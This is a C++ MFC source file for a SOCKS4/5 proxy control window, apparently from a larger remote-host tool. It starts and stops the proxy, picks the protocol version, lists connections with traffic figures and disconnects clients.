#include "stdafx.h"
#include "SocksProxyWnd.h"
#include "SocksProxySrv.h"
#include "SocksProxyTcp.h"
#include "SocksProxyUDPListener.h"
#include "SocksProxyAddrDlg.h"
#include "utils.h"
#include "dbg.h"

CSocksProxyWnd::CSocksProxyWnd(CSocksProxySrv*pHandler) :
m_pHandler(pHandler),
m_DestroyAfterDisconnect(FALSE)
{
	m_IsRunning = FALSE;
	m_pHandler->Get();
}


CSocksProxyWnd::~CSocksProxyWnd()
{
	m_pHandler->Put();
}

#define IDC_LIST 2351

BEGIN_MESSAGE_MAP(CSocksProxyWnd, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_MESSAGE(WM_SOCKS_PROXY_ERROR, OnError)
	ON_MESSAGE(WM_SOCKS_PROXY_CONNECTED, OnProxyConnected)
	ON_MESSAGE(WM_SOCKS_PROXY_CLOSED, OnProxyClosed)
	ON_COMMAND(ID_VER_SOCKS4, &CSocksProxyWnd::OnVerSocks4)
	ON_COMMAND(ID_VER_SOCKS5, &CSocksProxyWnd::OnVerSocks5)
	ON_COMMAND(ID_MAIN_STARTPROXY, &CSocksProxyWnd::OnMainStartproxy)
	ON_COMMAND(ID_MAIN_STOP, &CSocksProxyWnd::OnMainStop)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STARTPROXY, &CSocksProxyWnd::OnUpdateMainStartproxy)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STOP, &CSocksProxyWnd::OnUpdateMainStop)
	ON_WM_TIMER()
	ON_NOTIFY(NM_RCLICK, IDC_LIST, &CSocksProxyWnd::OnNMRClickList)
	ON_COMMAND(ID_CONNECTIONS_DISCONNECTALL, &CSocksProxyWnd::OnConnectionsDisconnectall)
	ON_COMMAND(ID_CONNECTIONS_DISCONNECT, &CSocksProxyWnd::OnConnectionsDisconnect)
END_MESSAGE_MAP()

#define SOCKS_PROXY_ID_LOG	100

int CSocksProxyWnd::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	CRect   rect;
	CString Text;
	CMenu*  pMenu;
	char    szIP[0x100];

	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	m_Menu.LoadMenu(IDR_SOCKS_PROXY_MENU);
	SetMenu(&m_Menu);
	//

	//默认是Socks5
	pMenu = m_Menu.GetSubMenu(1);

	pMenu->CheckMenuRadioItem(
		ID_VER_SOCKS5, 
		ID_VER_SOCKS4,
		ID_VER_SOCKS5, 
		MF_BYCOMMAND
	);
	
	GetClientRect(&rect);
	
	if (!m_Connections.Create(
		WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT,
		rect,
		this, 
		IDC_LIST)
	)
	{
		TRACE0("未能创建ClientList\n");
		return -1;      // 未能创建
	}

	DWORD dwExStyle = m_Connections.GetExStyle();
	m_Connections.ModifyStyle(LVS_SINGLESEL, 0);
	dwExStyle |= LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_AUTOCHECKSELECT | LVS_EX_CHECKBOXES;
	m_Connections.SetExtendedStyle(dwExStyle);
	
	//左对齐
	m_Connections.InsertColumn(0, TEXT("Type"), LVCFMT_LEFT, 80);
	m_Connections.InsertColumn(1, TEXT("Source"), LVCFMT_LEFT, 180);				//OK
	m_Connections.InsertColumn(2, TEXT("Remote/UDP Relay"), LVCFMT_LEFT, 230);				//OK
	m_Connections.InsertColumn(3, TEXT("Download"), LVCFMT_LEFT, 100);				//OK
	m_Connections.InsertColumn(4, TEXT("Upload"), LVCFMT_LEFT, 110);			//OK
	m_Connections.InsertColumn(5, TEXT("Time"), LVCFMT_LEFT, 230);				//--

	//set Text
	m_pHandler->GetPeerAddress(szIP);
	CString IP(szIP);
	Text.Format(TEXT("[%s] SocksProxy"), IP.GetBuffer());
	SetWindowText(Text);

	//move window...
	GetWindowRect(rect);
	rect.right = rect.left + 980;
	rect.bottom = rect.top + 460;
	MoveWindow(rect);

	//Set Notify Window,,
	m_pHandler->SetNotifyWindow(GetSafeHwnd());

	return 0;
}

void CSocksProxyWnd::OnNMRClickList(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO:  在此添加控件通知处理程序代码
	*pResult = 0;


	CMenu*pMenu = GetMenu()->GetSubMenu(2);
	POINT pt;
	GetCursorPos(&pt);
	pMenu->TrackPopupMenu(TPM_LEFTALIGN, pt.x, pt.y, this);	//阻塞.
}


/*
	1. Add				NotifyWindow;
	2. 每隔1s,刷新一次. 通过list获取Handle.然后获取 传输的流量大小.
	3. Remove.			RemoveFromList;
*/


LRESULT CSocksProxyWnd::OnProxyConnected(WPARAM wParam, LPARAM lParam)
{
	CSocksProxyTcp * proxy = (CSocksProxyTcp*)wParam;
	CString Source, Remote;
	CString Time = CTime(CTime::GetCurrentTime()).Format(TEXT("%Y-%m-%d %H:%M:%S"));

	int nIndex = m_Connections.GetItemCount();
	SOCKADDR_IN addr = { 0 };
	int namelen = sizeof(addr);
	
	//先插入,之后再更新信息
	m_Connections.InsertItem(nIndex, TEXT(""));
	proxy->GetPeerName((SOCKADDR*)& addr, &namelen);
	Source.Format(TEXT("%s:%d"), CString(inet_ntoa(addr.sin_addr)), addr.sin_port);

	m_Connections.SetItemText(nIndex, 1, Source);
	m_Connections.SetItemText(nIndex, 5, Time);

	//保存ctx.
	m_Connections.SetItemData(nIndex, (DWORD)proxy);
	//dbg_log("add proxy : %p\n", wParam);
	return 0;
}

LRESULT CSocksProxyWnd::OnProxyClosed(WPARAM wParam, LPARAM lParam)
{
	LVFINDINFO info = { 0 };
	int nIndex;
	info.flags = LVFI_PARAM;
	info.lParam = wParam;					//Client ID;

	//find item by clientCtx;
	if ((nIndex = m_Connections.FindItem(&info)) >= 0)
	{
		m_Connections.DeleteItem(nIndex);
		//dbg_log("remove proxy: %p\n", wParam);
	}
	else
	{
		ASSERT(FALSE);
	}
	return 0;
}

LRESULT CSocksProxyWnd::OnError(WPARAM wParam, LPARAM lParam){
	TCHAR* szError = (TCHAR*)wParam;
	MessageBox(szError, TEXT("Tips"), MB_OK | MB_ICONINFORMATION);
	return 0;
}

void CSocksProxyWnd::OnClose()
{
	m_pHandler->SetNotifyWindow(NULL);
	m_pHandler->Close();
	DestroyWindow();
}


void CSocksProxyWnd::PostNcDestroy()
{
	delete this;
}


void CSocksProxyWnd::OnSize(UINT nType, int cx, int cy)
{
	CFrameWnd::OnSize(nType, cx, cy);
	RECT rect;

	if (m_hWnd && m_Connections.m_hWnd)
	{	
		GetClientRect(&rect);
		m_Connections.MoveWindow(&rect);
	}
}


void CSocksProxyWnd::OnVerSocks4()
{
	
		m_pHandler->SetSocksVersion(0x4);

		GetMenu()->GetSubMenu(1)->
			CheckMenuRadioItem(
			ID_VER_SOCKS5,
			ID_VER_SOCKS4,
			ID_VER_SOCKS4,
			MF_BYCOMMAND
		);
	
}


void CSocksProxyWnd::OnVerSocks5()
{
	
		m_pHandler->SetSocksVersion(0x5);

		GetMenu()->GetSubMenu(1)->
			CheckMenuRadioItem(
			ID_VER_SOCKS5, 
			ID_VER_SOCKS4,
			ID_VER_SOCKS5, 
			MF_BYCOMMAND
		);
	
}


void CSocksProxyWnd::OnMainStartproxy()
{
	CSocksProxyAddrDlg dlg;

	if (dlg.DoModal() == IDOK)
	{
		in_addr ipv4_listen;
		in_addr ipv4_udpassociate;

		ipv4_listen.S_un.S_addr = ntohl(dlg.m_Addr);
		ipv4_udpassociate.S_un.S_addr = ntohl(dlg.m_UDPAssociateAddress);

		lstrcpyA(m_ListenAddress, inet_ntoa(ipv4_listen));
		lstrcpyA(m_UdpAssociateAddr, inet_ntoa(ipv4_udpassociate));

		m_ListenPort = dlg.m_Port;

		if (m_pHandler->StartProxyServer(m_ListenPort, m_ListenAddress, m_UdpAssociateAddr))
		{
			MessageBox(
				TEXT("Start Proxy Server Success!"),
				TEXT("Tips"), 
				MB_OK | MB_ICONINFORMATION
			);

			m_IsRunning = TRUE;
			SetTimer(10086, 1000, 0);
			return;
		}
		
		MessageBox(
			TEXT("Start Proxy Server Failed!"),
			TEXT("Tips"),
			MB_OK | MB_ICONINFORMATION);
	}
}


void CSocksProxyWnd::OnMainStop()
{
	if (m_IsRunning)
	{
			m_pHandler->StopProxyServer();
			
			MessageBox(
				TEXT("Proxy server has been stopped!"),
				TEXT("Tips"),
				MB_OK | MB_ICONINFORMATION
			);

			CString Text;
			char	szIP[0x100];

			m_pHandler->GetPeerAddress(szIP);
			Text.Format(TEXT("[%s] SocksProxy"), CString(szIP));
			
			SetWindowText(Text);

			m_IsRunning = FALSE;
			KillTimer(10086);
	}
}


void CSocksProxyWnd::OnUpdateMainStartproxy(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(!m_IsRunning);
}


void CSocksProxyWnd::OnUpdateMainStop(CCmdUI *pCmdUI)
{
	pCmdUI->Enable(m_IsRunning);
}


void CSocksProxyWnd::OnTimer(UINT_PTR nIDEvent)
{
	int PageFirst, PageLast, Last,CntPerPage;
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	
	CString Text;
	SOCKADDR_IN addr;
	char	szIP[0x100];
	
	DWORD Connections = m_pHandler->GetConnections();
	m_pHandler->GetPeerAddress(szIP);
	CString IP(szIP);
	CString ListenAddress(m_ListenAddress);

	Text.Format(
		TEXT("[%s] SocksProxy - Listen: %s.%d Connections:%d"),
		IP.GetBuffer(),
		ListenAddress.GetBuffer(),
		m_ListenPort,
		Connections
	);

	SetWindowText(Text);
	
	PageFirst	= m_Connections.GetTopIndex();
	CntPerPage  = m_Connections.GetCountPerPage();
	Last	    = m_Connections.GetItemCount() - 1;
	PageLast	= min((PageFirst + CntPerPage), Last);

	for (int i = PageFirst; i <= PageLast; i++)
	{
		LARGE_INTEGER li_DownloadSize,li_UploadSize;
		ULONGLONG	traffic[2];
		TCHAR		szUpload[0x20], szDownload[0x20];
		CSocksProxyTcp*  proxy = (CSocksProxyTcp*)m_Connections.GetItemData(i);
		CString Remote;
		
		switch (proxy->Cmd())
		{
		case SOCKS_CMD_CONNECT:
			if (m_Connections.GetItemText(i, 0) != TEXT("TCP"))
			{
				m_Connections.SetItemText(i, 0, TEXT("TCP"));
			}

			switch (proxy->ConnectAddrType())
			{
			case ADDRTYPE_IPV4:
				Remote.Format(
					TEXT("%s:%d"),
					CString(inet_ntoa(*(in_addr*)proxy->ConnectAddress())),
					ntohs(proxy->ConnectPort()));
				break;

			case ADDRTYPE_DOMAIN:
				Remote.Format(
					TEXT("%s:%d"),
					CString(proxy->ConnectAddress()), 
					ntohs(proxy->ConnectPort()));
				break;
			}
			break;
		case SOCKS_CMD_UDPASSOCIATE:
			
			if (m_Connections.GetItemText(i, 0) != TEXT("UDP"))
			{
				m_Connections.SetItemText(i, 0, TEXT("UDP"));
			}
			
			if (proxy->GetUdpListener())
			{
				int namelen = sizeof(addr);
				proxy->GetUdpListener()->GetSockName((SOCKADDR*)&addr, &namelen);
				addr.sin_addr.S_un.S_addr = m_pHandler->GetUDPAssociateAddr();
				Remote.Format(TEXT("%s:%d"), CString(inet_ntoa(addr.sin_addr)), ntohs(addr.sin_port));
			}
			break;
		default:
			break;
		}

		//update connect address.
		if (m_Connections.GetItemText(i, 2) != Remote)
		{
			m_Connections.SetItemText(i, 2, Remote);
		}

		//update upload and download traffic.
		proxy->GetTraffic(traffic);
		li_DownloadSize.QuadPart = traffic[0];
		li_UploadSize.QuadPart = traffic[1];
		GetStorageSizeString(li_DownloadSize, szDownload);
		GetStorageSizeString(li_UploadSize, szUpload);

		if (m_Connections.GetItemText(i, 3) != szDownload)
		{
			m_Connections.SetItemText(i, 3, szDownload);
		}
		
		if (m_Connections.GetItemText(i, 4) != szUpload)
		{
			m_Connections.SetItemText(i, 4, szUpload);
		}
	}
	
	CFrameWnd::OnTimer(nIDEvent);
}



void CSocksProxyWnd::OnConnectionsDisconnectall()
{
	for (int i = 0; i < m_Connections.GetItemCount(); i++)
	{
		CSocksProxyTcp*pCtx = (CSocksProxyTcp*)m_Connections.GetItemData(i);
		pCtx->Close();
	}
}

void CSocksProxyWnd::OnConnectionsDisconnect()
{
	POSITION pos = m_Connections.GetFirstSelectedItemPosition();
	while (pos)
	{
		int index = m_Connections.GetNextSelectedItem(pos);
		CSocksProxyTcp*pCtx = (CSocksProxyTcp*)m_Connections.GetItemData(index);
		pCtx->Close();
	}
}
